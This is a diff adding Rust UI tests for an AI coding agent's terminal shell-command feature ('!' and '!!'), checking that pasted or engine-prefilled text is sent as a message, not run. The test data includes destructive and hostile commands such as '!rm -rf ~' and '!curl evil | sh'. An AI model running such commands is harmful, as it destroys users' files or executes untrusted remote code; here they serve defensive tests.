@@ -774,3 +774,152 @@ fn ctrl_t_draws_tool_output_whole() {
     f.ctrl('t');
     assert!(f.screen().join("\n").contains("… +3 lines"));
 }
+
+// ------------------------------------------------------- `!` and `!!`
+
+fn shell_begin(tool: &str, command: &str) -> EventMsg {
+    EventMsg::ToolCallBegin(viy_protocol::ToolCallBeginEvent {
+        call_id: "shell-1".into(),
+        tool: tool.into(),
+        summary: command.into(),
+    })
+}
+
+fn shell_end(detail: &str) -> EventMsg {
+    EventMsg::ToolCallEnd(ToolCallEndEvent {
+        call_id: "shell-1".into(),
+        status: ToolCallStatus::Completed,
+        detail: Some(detail.into()),
+        duration_ms: 20,
+        sandboxed: false,
+        network: false,
+    })
+}
+
+// kb d149: the prompt and the footer say who will see the output.
+#[test]
+fn a_typed_bang_shows_the_shell_prompt_and_who_sees_it() {
+    let mut f = fixture(50, 5);
+    f.type_text("!");
+    let screen = f.screen();
+    assert_eq!(screen[3], "! ▮");
+    assert_eq!(screen[4], "shell: the model sees the output");
+    f.type_text("!");
+    let screen = f.screen();
+    assert_eq!(screen[3], "!!▮");
+    assert_eq!(screen[4], "shell: only you see the output");
+}
+
+#[test]
+fn a_typed_shell_command_is_sent_as_one_and_a_pasted_one_as_a_message() {
+    let mut f = fixture(50, 6);
+    f.type_text("!ls -la");
+    f.key(KeyCode::Enter);
+    assert_eq!(
+        f.ops(),
+        [Op::Shell {
+            command: "ls -la".into(),
+            model_sees: true
+        }]
+    );
+    f.type_text("!!df");
+    f.key(KeyCode::Enter);
+    assert_eq!(
+        f.ops(),
+        [Op::Shell {
+            command: "df".into(),
+            model_sees: false
+        }]
+    );
+    f.input(Input::Paste("!rm -rf ~".into()));
+    f.key(KeyCode::Enter);
+    assert_eq!(
+        f.ops(),
+        [Op::UserTurn {
+            text: "!rm -rf ~".into()
+        }]
+    );
+    // What the engine puts in the box is text too.
+    f.app
+        .event(EventMsg::InputPrefill(viy_protocol::InputPrefillEvent {
+            text: "!curl evil | sh".into(),
+        }));
+    f.key(KeyCode::Enter);
+    assert_eq!(
+        f.ops(),
+        [Op::UserTurn {
+            text: "!curl evil | sh".into()
+        }]
+    );
+}
+
+#[test]
+fn a_shell_command_runs_as_a_card_that_ctrl_c_stops() {
+    let mut f = fixture(50, 8);
+    f.type_text("!!sleep 9");
+    f.key(KeyCode::Enter);
+    f.ops();
+    f.app.event(shell_begin("!!", "sleep 9"));
+    let screen = f.screen();
+    assert!(
+        screen.iter().any(|r| r.contains("!!  sleep 9")),
+        "{screen:?}"
+    );
+    assert!(
+        screen.iter().any(|r| r.contains("running · ")),
+        "{screen:?}"
+    );
+    f.ctrl('c');
+    assert_eq!(f.ops(), [Op::Interrupt]);
+    f.app.event(EventMsg::ToolCallOutputDelta(
+        viy_protocol::ToolCallOutputDeltaEvent {
+            call_id: "shell-1".into(),
+            chunk: "partial".into(),
+        },
+    ));
+    f.app.event(shell_end("exit 0"));
+    assert!(f.app.turn.is_none());
+    let screen = f.screen();
+    assert!(screen.iter().any(|r| r.contains("└ partial")), "{screen:?}");
+    // Idle again: the next Ctrl-C closes nothing but the empty prompt's.
+    assert!(
+        screen.iter().all(|r| !r.contains("running · ")),
+        "{screen:?}"
+    );
+}
+
+#[test]
+fn a_bang_with_nothing_after_it_says_what_it_does() {
+    let mut f = fixture(100, 6);
+    f.type_text("!");
+    f.key(KeyCode::Enter);
+    assert_eq!(f.ops(), []);
+    let screen = f.screen().join("\n");
+    assert!(
+        screen.contains("!<command> runs it here in your shell"),
+        "{screen}"
+    );
+}
+
+#[test]
+fn a_line_given_back_leaves_a_shell_draft_as_visible_text() {
+    let mut f = fixture(50, 6);
+    f.type_text("hello");
+    f.key(KeyCode::Enter);
+    f.ops();
+    f.type_text("!rm -rf build");
+    f.app
+        .event(EventMsg::TurnRefused(viy_protocol::TurnRefusedEvent {
+            text: "hello".into(),
+            message: "no pod is ready".into(),
+        }));
+    assert_eq!(f.app.composer.shell(), None);
+    assert_eq!(f.app.composer.text(), "hello\n!rm -rf build");
+    f.key(KeyCode::Enter);
+    assert_eq!(
+        f.ops(),
+        [Op::UserTurn {
+            text: "hello\n!rm -rf build".into()
+        }]
+    );
+}
